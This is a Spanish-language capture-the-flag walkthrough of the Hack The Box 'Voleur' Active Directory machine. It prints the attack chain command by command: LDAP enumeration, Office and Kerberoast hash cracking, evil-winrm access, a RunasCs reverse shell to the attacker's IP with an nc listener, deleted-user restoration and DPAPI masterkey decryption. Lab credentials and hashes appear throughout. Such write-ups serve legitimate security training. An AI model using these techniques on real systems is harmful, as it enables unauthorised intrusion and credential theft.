# Context

>As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: `ryan.naylor:HollowOct31Nyt`

# Enumeration

>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ sudo nmap -p- -sS -Pn -n -v --open --min-rate 5000 -sV 10.10.11.76
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 05:05 EDT

<SNIP>

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-13 17:06:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
54112/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54114/tcp open  msrpc         Microsoft Windows RPC
55451/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.00 seconds
           Raw packets sent: 131066 (5.767MB) | Rcvd: 30 (1.320KB)
```

>Vemos que la autenticación por **NTLM** está **deshabilitada**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ nxc smb 10.10.11.76 -u ryan.naylor -p 'HollowOct31Nyt' 
SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ echo "10.10.11.76 voleur.htb DC.voleur.htb" >> /etc/hosts
```

>Al estar deshabilitada la autenticación por NTLM, vamos a hacer consultas **LDAP**, por ejemplo, vamos a enumerar usuarios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ ldapsearch -x -H ldap://voleur.htb -D "voleur\ryan.naylor" -w HollowOct31Nyt -b "dc=voleur,dc=htb" "(objectclass=user)" sAMAccountName | grep sAMAccountName | awk -F ":" '{print $2}' | sed 's/ //'
sAMAccountName 
Administrator
Guest
DC$
krbtgt
ryan.naylor
marie.bryant
lacey.miller
svc_ldap
svc_backup
svc_iis
jeremy.combs
svc_winrm
```

>Vamos a configurar el realm de Kerberos de la siguiente forma para poder pedir un TGT del usuario **ryan.naylor** (/etc/krb5.conf):

```
[libdefaults]
  default_realm = voleur.htb

[realms]
  VOLEUR.HTB = {
    kdc = DC.VOLEUR.HTB:88
    admin_serve = DC.VOLEUR.HTB
    default_domain = VOLEUR.HTB
  }

[domain_realm]
    .voleur.htb = voleur.htb
    voleur.htb = voleur.htb
```

>Antes de pedir el TGT, para asegurarnos que funciona el ticket deberemos sincronizarnos con la hora del DC:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ sudo ntpdate 10.10.11.76                                          
2025-10-13 13:17:07.801958 (-0400) +28801.531872 +/- 0.033811 10.10.11.76 s1 no-leap
CLOCK: time stepped by 28801.531872
```

>Vamos a pedir el TGT del usuario **ryan.naylor**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ kinit RYAN.NAYLOR@VOLEUR.HTB
Password for RYAN.NAYLOR@VOLEUR.HTB: 
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ klist                       
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: RYAN.NAYLOR@VOLEUR.HTB

Valid starting       Expires              Service principal
10/13/2025 13:14:56  10/13/2025 23:14:56  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 10/14/2025 13:14:53
```

>Ahora que podemos autenticarnos, obtenemos los datos de bloodhound:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ bloodhound-ce-python -u ryan.naylor -k -no-pass -ns 10.10.11.76 -d voleur.htb -c all
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Done in 00M 12S
```

>No hay nada interesante aún en los archivos de bloodhound, por lo que vamos a enumerar las shares de SMB:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

>Vamos a entrar en la de IT, para ello antes pediremos un TGT para poder usar el cliente SMB de impacket:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ impacket-getTGT voleur.htb/ryan.naylor:'HollowOct31Nyt' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ export KRB5CCNAME=ryan.naylor.ccache
```

>Ahora nos conectamos a la share:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ impacket-smbclient -k dc.voleur.htb                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 16:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 First-Line Support
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
-rw-rw-rw-      16896  Thu May 29 18:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
# exit
```

>El archivo de excel está **password protected** así que vamos a crackearlo:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ office2john Access_Review.xlsx 
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ micro access_hash                                                                                         
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ john -w=/usr/share/wordlists/rockyou.txt access_hash   
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:04 DONE (2025-10-13 13:40) 0.2380g/s 186.6p/s 186.6c/s 186.6C/s football1..lolita
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

>Si abrimos el excel vemos los siguientes datos interesantes:

<img width="1179" height="265" alt="image" src="https://github.com/user-attachments/assets/0aeba649-e4e0-4c74-85e7-81d9538167fb" />

>Ahora tenemos las credenciales siguientes:

```
svc_ldap:M1XyC9pW7qT5Vn
svc_iis:N5pXyW1VqM7CZ8
Todd.Wolfe:NightT1meP1dg3on14
```

>Como podemos ver, el usuario **svc_ldap** tiene una ACE de **WriteSPN** sobre el usuario **svc_winrm**:

<img width="1032" height="317" alt="image" src="https://github.com/user-attachments/assets/43a88235-2b8b-437e-be35-18f75f31f3cb" />

>Por lo que vamos a pedir el TGT del usuario **svc_ldap** para poder emplearlo:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ impacket-getTGT voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ export KRB5CCNAME=svc_ldap.ccache
```

>El ACE **WriteSPN** nos permite realizar un ataque **Targeted Kerberoast** que efectuaremos de la siguiente forma:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ python3 targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$09670d6b30b3b34efa5587d9f3dd6a9f$0a1bdaf8ef6c880b6bcb93adf9c92809f6dafe2530e2a5fb2ae2ba7c454f026f8b6f507eb09384fb63eb7e248181aadaa2daf62727f2677f0e77edfba64cb326a5bde85a56b0921cdca86c6ad4d3b7039d8282e2ac46c2f3c55434667ca5f31710042bcacc95f9eee13e499e36bdb64dccee53dcd5d6058d04125406bc60eddb4ab2a096e12dc8f27647ff320cd513daf3a8727ce9e4078795e66f7150b6eccd87d3ccfb12944795f99f3945e81455b5bcc9aeea5d80f8f0bd370265494d5555eed2804e3550be50622b2963a480936b0488d9d738df29485c82602f2a02596046af6cb6cbdd99b07766740c2e123902a5bff94e60c44df258aa01cfd13a3d84efdd3c78e701e3ccfdfafc2a38baf966f4ea461a596cce8ef586423aec9db7f921cabdc227992fa1ce396977c23aeac9b7e6a65d4a229f925d98029321174c5cdabf3c685c88d65172a9f3f653b5fddd6dd14c8b605e8cc9cf7ad4723ea68a649eb4be77279af6a7bae3338c1d2377ba3cce7240465f7d82ae66c24546cd383715ca32f43e7fc335ec59c2a5479f6768b6aea2e26c5ab7405d2c815230d47b1f30145be5c327d8fd5b5e17cc1e24503dc925ffadf74be93a2c74458cb1cfce7a292848f77558c5b811a54994571e70ea0cbb644e6d530afd635f39f32d5edd22607c20d674a594b09a487d9bab80f29d6323dad55f487378672e236c5f1a4d80070f359f8b4f34081e6d29a1868aedd1b6e6e60ef5761363d316590a51eba2492061d958c6b27a40eecdbccdae858052e7b918b6118a29f49f8619dfdf95c36461dd6f85709edaec9e944111f81fe032927f08ab2d51d31e93bcae7f28ff4abf58c62a2a49185d12d0853c36028d76f32d52f6623e1f8638f628f7945ae0579c65452eacbce85d0b92fcbab6bdde000622f4aaf6876694d264ab77d23499c8dba93d8f3b8697a69b87a8c540e1cdd335d39ebaa69df7ed4cfcc6bf605fda9453a775ee5c10db6b14d8a5343d53f6acf84d00009cb0c551747170dcf108bf4fd79cab27beca2025f01e610da79d6331ed832ee481ab287f55702510314a99691c22db394e9ee9f38965aeb44f159dd49ed0001ca85231cebd21a6479accafa671116b0508539031fc93c698851e408838be23a3957b472f8cff82e6e8aafb8ff5c7cf53b8f4aab4e4c3bad9a64f3d135244aab221ed135495c1745fe1571a9caf6d8bfb88007d97cecedc6dd60a2cab355d43980bc48855bb82648e48e295fc4dc81713ad07330d9e2bdaa3af1c5b8561c52cbd35ff5fd17974a41e4e178091f66b9b35d00b1afb6fefb5a686dfd9f7ba27befa5bbbb4f28339d04f398cd9d3f318ead3089ba2652a604fd9cb638eed76712d655424f7753ff91edbbcfb3bec159476b5b0e3b9a9a939964ad316d82a311681c1e6f260fda3a3abd28676e8752c3618e4e296032d36c8e794ee5d4a73b943ace4
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$9132c47f3183c57f7c8e00617b4b3883$ada001697795476186be7af4f1abf07d9a19c4e4890b4d6367b1fcc6bc6eee34d6e43b16e57d32cc91db9f5f9503c1936e66f44b32d868fbcdc04fa7819f0b5e89a271489235385d221d639a7c0943e186671f7c986bd02fdf582857e9401e7ea9c05480688c2f794719348d9f18c6637e48758dc728b675d6491b42516b5a978864e91126056a96a26f3ddc84d102a826f6298598f4ff012269f502fb057aa645673cf0f0f1847fa3a811553e6fdb58cc9fcf182ad5a8847932130968551af39132c016a0701b539568f4982ec28c1549f2a61b0bea7dba16afaaf031ac2b9bf1f80346ecf316352e5c9ab06256b20423c80a3579372fbcf430a441127332686b1df799b9d396eb0be132d99e958df5cb2807e355fa1803f6221a18be422a65450f6fe6823904d080741bc05687a9cf3f81ae7b8edeb06a8df3418a596993e23122969c84cbe199f19ec752977898e610943941cbde131c3232e6ad4444c69e0d8de0a063798fe4d4ad6c3e5f0b3edbcf1a06d0c9c7c4465980e779db8df2bbef441603a1ef3bfbcd4eea515f7b1845aa9171f79602cad5ccddfd8332bcfc948dae22b62f13f447a2ab94c40b8348655ace6801cc5558db4ccef285f8cd701811e4237ffb30c4344caccedb7639586984ad8d1c0a5c5245b1645c65cc1d2da5993cebaef0094677a702fd2b41e6c7661dba35d77a78f9184f70840d92af5f55bbc130286e77e33d6b8248c7fc5dd2e09e45ca821f57ace55debe2a77798018f0e5da4601fdd40e0c562c4d571b6fc470bdb1be2bc9c193a5e512c7ad78812c7183d7df42055c543e38985e1deb64a39e73a22cebae647827235c929606678b5e93506879974071a2420e31ea44c3721f849a27e146168b139a694fb6dafc48e5531765086ecdce2c51b8cb00a0a5bedbf6629c229d455a8d96cb2c4fdca1a8f8a701b656a306977746bcc13c82f8fddea46a91ff3d83b417cdb3d3de8c26bcc61c05caeb6f92c5ce2c386c4e8ce16ed4fe63390a8b1fa114b904db82c81d54693d8643167e19e4c009c1d1994feaec6a64a49b6d21a8b13f8363eea9f84ce85bd43248130f6e7913854a22c915a323f85eda8572fd6ecbc516880dc1773c6b78dcb7f18e3938749d031182e7246040fdfb7e77d1b4e82ce759eca681f6032a83a459b15c43edc78ab4bdf105f82b4ae3fbd7d9c044782fd789aa032df09ead03d95247a3d968da2a3e706a0fa26ceebed9c87f754077a6acf4cf4090cf6b4f884745c9443efce0deb4f0301eb538acb8daea838a00c27847a2b47e88616079c0d240c5456586a6199b594dc790cb7cf6a800e87eda0764cdad83a57aa97bc93e44eb9b7c28abf10140a73989aa9c0b518d69df25566d6d5b796296080f8ef7d2ee6dd854973019ad2b93778d366f0ece8e59d1b2050a2562afe7021b82bc3a17ffd26378b74f8d6b5ec49fd726089d96939b9
```

>Crackeamos el hash de **svc_winrm**: `svc_winrm:AFireInsidedeOzarctica980219afi`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ hashcat -m 13100 svc_winrm_hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

<SNIP>

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$9132c47f3183c57f7c8e00617b4b3883$ada001697795476186be7af4f1abf07d9a19c4e4890b4d6367b1fcc6bc6eee34d6e43b16e57d32cc91db9f5f9503c1936e66f44b32d868fbcdc04fa7819f0b5e89a271489235385d221d639a7c0943e186671f7c986bd02fdf582857e9401e7ea9c05480688c2f794719348d9f18c6637e48758dc728b675d6491b42516b5a978864e91126056a96a26f3ddc84d102a826f6298598f4ff012269f502fb057aa645673cf0f0f1847fa3a811553e6fdb58cc9fcf182ad5a8847932130968551af39132c016a0701b539568f4982ec28c1549f2a61b0bea7dba16afaaf031ac2b9bf1f80346ecf316352e5c9ab06256b20423c80a3579372fbcf430a441127332686b1df799b9d396eb0be132d99e958df5cb2807e355fa1803f6221a18be422a65450f6fe6823904d080741bc05687a9cf3f81ae7b8edeb06a8df3418a596993e23122969c84cbe199f19ec752977898e610943941cbde131c3232e6ad4444c69e0d8de0a063798fe4d4ad6c3e5f0b3edbcf1a06d0c9c7c4465980e779db8df2bbef441603a1ef3bfbcd4eea515f7b1845aa9171f79602cad5ccddfd8332bcfc948dae22b62f13f447a2ab94c40b8348655ace6801cc5558db4ccef285f8cd701811e4237ffb30c4344caccedb7639586984ad8d1c0a5c5245b1645c65cc1d2da5993cebaef0094677a702fd2b41e6c7661dba35d77a78f9184f70840d92af5f55bbc130286e77e33d6b8248c7fc5dd2e09e45ca821f57ace55debe2a77798018f0e5da4601fdd40e0c562c4d571b6fc470bdb1be2bc9c193a5e512c7ad78812c7183d7df42055c543e38985e1deb64a39e73a22cebae647827235c929606678b5e93506879974071a2420e31ea44c3721f849a27e146168b139a694fb6dafc48e5531765086ecdce2c51b8cb00a0a5bedbf6629c229d455a8d96cb2c4fdca1a8f8a701b656a306977746bcc13c82f8fddea46a91ff3d83b417cdb3d3de8c26bcc61c05caeb6f92c5ce2c386c4e8ce16ed4fe63390a8b1fa114b904db82c81d54693d8643167e19e4c009c1d1994feaec6a64a49b6d21a8b13f8363eea9f84ce85bd43248130f6e7913854a22c915a323f85eda8572fd6ecbc516880dc1773c6b78dcb7f18e3938749d031182e7246040fdfb7e77d1b4e82ce759eca681f6032a83a459b15c43edc78ab4bdf105f82b4ae3fbd7d9c044782fd789aa032df09ead03d95247a3d968da2a3e706a0fa26ceebed9c87f754077a6acf4cf4090cf6b4f884745c9443efce0deb4f0301eb538acb8daea838a00c27847a2b47e88616079c0d240c5456586a6199b594dc790cb7cf6a800e87eda0764cdad83a57aa97bc93e44eb9b7c28abf10140a73989aa9c0b518d69df25566d6d5b796296080f8ef7d2ee6dd854973019ad2b93778d366f0ece8e59d1b2050a2562afe7021b82bc3a17ffd26378b74f8d6b5ec49fd726089d96939b9:AFireInsidedeOzarctica980219afi
                                                          
<SNIP>
```

>Obtenemos su TGT:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ impacket-getTGT voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ export KRB5CCNAME=svc_winrm.ccache
```

>Nos conectamos mediante winrm y obtenemos la user flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> ls


    Directory: C:\Users\svc_winrm\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-ar---        10/13/2025  10:16 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
e422fe6a240bcadeb64c8a80df72f134
```

>Subimos RunasCs para poder enviarnos una reverse shell como el usuario **svc_ldap** para poder abusar que pertenece al grupo **Restore User**:

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> upload ../../academy_tools/RunasCs.exe
                                        
Info: Uploading /home/kali/Desktop/machines/voleur/../../academy_tools/RunasCs.exe to C:\Users\svc_winrm\Desktop\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
```

>Nos enviamos la reverse shell:

```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> .\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.15.71:443
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-23b0ab$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5008 created in background.
```

>Recibimos la shell, recordar que debemos tener el listener antes de ejecutar el comando anterior:

```bash
┌──(kali㉿jbkira)-[~]
└─$ nc -nlvp 443                                                        
listening on [any] 443 ...
connect to [10.10.15.71] from (UNKNOWN) [10.10.11.76] 55487
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\svc_ldap
```

>Ahora podemos enumerar los **usuarios eliminados** de la siguiente forma:

```powershell
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

>Por lo que vamos a tratar de restaurar el usuario:

```bash
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects | Restore-ADObject
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects | Restore-ADObject
PS C:\Windows\system32> net user
net user

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap                 
todd.wolfe               
The command completed successfully.
```

>Ahora podemos pedir su TGT para poder autenticarnos como este usuario:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ impacket-getTGT voleur.htb/Todd.Wolfe:'NightT1meP1dg3on14'             
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Todd.Wolfe.ccache
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ export KRB5CCNAME=Todd.Wolfe.ccache
```

>Podemos ver las shares que puede acceder:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ nxc smb dc.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -k --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

>Al conectarnos a la share vemos lo que parece ser el directorio personal del usuario todd.wolfe:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ impacket-smbclient -k dc.voleur.htb                                    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 16:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:13:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 09:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 10:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 07:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 07:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 07:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Videos
```

>Aquí podemos tratar de buscar archivos protegidos por DPAPI para obtener su contenido, primero descargamos el blob:

```bash
# cd AppData/Roaming/Microsoft/Protect
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 07:53:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 07:53:08 2025 SYNCHIST
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 08:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 07:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 07:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
```

>Y ahora descargamos la key:

```bash
# cd ../../Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 08:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
```

>Ahora crackeamos la key con la herramienta de impacket **dpapi**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/voleur]
└─$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
